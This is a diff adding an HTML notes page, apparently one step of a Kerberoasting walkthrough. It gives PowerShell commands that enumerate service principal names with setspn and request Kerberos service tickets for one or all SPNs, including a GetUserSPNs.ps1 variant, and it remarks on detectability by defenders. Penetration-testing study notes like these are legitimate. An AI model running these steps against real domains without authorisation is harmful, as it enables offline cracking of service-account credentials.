@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>2. Request ServiceTicket</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>2. Request ServiceTicket</h1><br /><br />Displays a list of currently cached Kerberos tickets
+    granted to the current logon session<br />
+    <div class="codebox">
+      <div class="codebox">PS&gt;&nbsp;klist.exe</div>
+    </div><br /><br /><strong>Request new </strong><strong><span
+        style="color:#ff00e0;">ServiceTicket</span></strong><strong> for a service:</strong><br />
+    <div class="codebox">
+      <div class="codebox">PS&gt;&nbsp;setspn&nbsp;-T&nbsp;[DOMAIN]&nbsp;-F&nbsp;-Q&nbsp;*/*</div>
+    </div><br /> <a href=""><img src="images/1132-1.png" alt="images/1132-1.png" /></a><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;Add-Type&nbsp;-AssemblyName&nbsp;System.IdentityModel<br />PS&gt;&nbsp;New-Object&nbsp;System.IdentityModel.Tokens.KerberosRequestorSecurityToken&nbsp;-ArgumentList&nbsp;&quot;TESTDC/SQLService.DANIELE.local:60111&quot;&nbsp;&nbsp;#change&nbsp;DANIELE<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;your&nbsp;domain<br />
+      </div>
+    </div><br /> <a href=""><img src="images/1132-2.png" alt="images/1132-2.png" /></a><br />Now we should have a new
+    ticket for the service cached on the system<br />
+    <div class="codebox">
+      <div class="codebox">PS&gt;&nbsp;klist.exe</div>
+    </div> <br /> <a href=""><img src="images/1132-3.png" alt="images/1132-3.png" /></a><br /><br /><strong>Request
+    </strong><strong><span style="color:#ff00e0;">ServiceTicket</span></strong><strong> for all the
+      services:</strong><br />More easily detectable by Defenders!<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;Add-Type&nbsp;-AssemblyName&nbsp;System.IdentityModel<br />PS&gt;&nbsp;setspn&nbsp;-T&nbsp;[DOMAIN]&nbsp;-Q&nbsp;*/*&nbsp;|&nbsp;Select-String&nbsp;&quot;CN=Users&quot;&nbsp;-Context&nbsp;0,1&nbsp;|&nbsp;%&nbsp;<span
+          style="color:#000000;font-weight:400">{</span>&nbsp;New-Object&nbsp;System.IdentityModel.Tokens.KerberosRequestorSecurityToken&nbsp;-ArgumentList&nbsp;$_.Context.PostContext[0].Trim()&nbsp;<span
+          style="color:#000000;font-weight:400">}</span></div>
+    </div><br /> <a href=""><img src="images/1132-4.png" alt="images/1132-4.png" /></a><br />Alternative using script
+    GetUserSPNs.ps1 from <a href="https://github.com/nidem/kerberoast" target="_blank">Kerberoast</a> project of Tim Medin<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;Add-Type&nbsp;-AssemblyName&nbsp;System.IdentityModel<br />PS&gt;&nbsp;.\GetUserSPNs.ps1&nbsp;|&nbsp;%&nbsp;<span
+          style="color:#000000;font-weight:400">{</span>New-Object&nbsp;System.IdentityModel.Tokens.KerberosRequestorSecurityToken&nbsp;-ArgumentList&nbsp;$_.ServicePrincipalName<span
+          style="color:#000000;font-weight:400">}</span></div>
+    </div><br /> <a href=""><img src="images/1132-5.png" alt="images/1132-5.png" /></a><br />
+  </div>
+</body>
+
+</html>
